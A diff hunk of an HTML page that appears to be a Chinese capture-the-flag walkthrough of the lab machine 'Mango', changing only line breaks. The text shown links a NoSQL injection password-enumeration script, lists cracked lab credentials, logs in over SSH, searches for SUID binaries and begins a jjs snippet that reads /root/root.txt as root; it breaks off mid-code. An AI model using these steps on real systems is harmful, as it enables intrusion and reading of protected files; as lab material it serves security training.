@@ -7556,16 +7556,16 @@
 <p>先了解一些 mangodb 在 web 知识库补充</p>
 <p>有个专门爆破用户名和密码的脚本：<a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
 <p><img alt="image.png" src="../img/551828_ktnm61qch4s8at3a/1583973993862-b26ea0b0-e4b4-45b2-bd62-3b38c74a97c0-819161.png" /></p>
-<p>太慢了，就直接用大佬的结果了
-mango：h3mXK8RhU~f{]f5H
+<p>太慢了，就直接用大佬的结果了<br />
+mango：h3mXK8RhU~f{]f5H<br />
 admin：t9KcS3&gt;!0B#2</p>
 <p>可以直接用 ssh 登录到 ssh mango@10.10.10.162</p>
 <p><img alt="image.png" src="../img/551828_ktnm61qch4s8at3a/1583974501839-3686e7f7-f36a-46e9-a8e2-cc9525bd76d4-701975.png" /></p>
 <p>su admin 切换到 admin 用户</p>
 <p>在 admin 的目录下面找到 user.txt</p>
-<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null
+<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null<br />
 可以发现 jjs 是用 root 运行的</p>
-<p>运行 jjs 
+<p>运行 jjs <br />
 这样输入：</p>
 <pre><code class="language-json">var filename = &quot;/root/root.txt&quot;;
 var content = new java.lang.String(
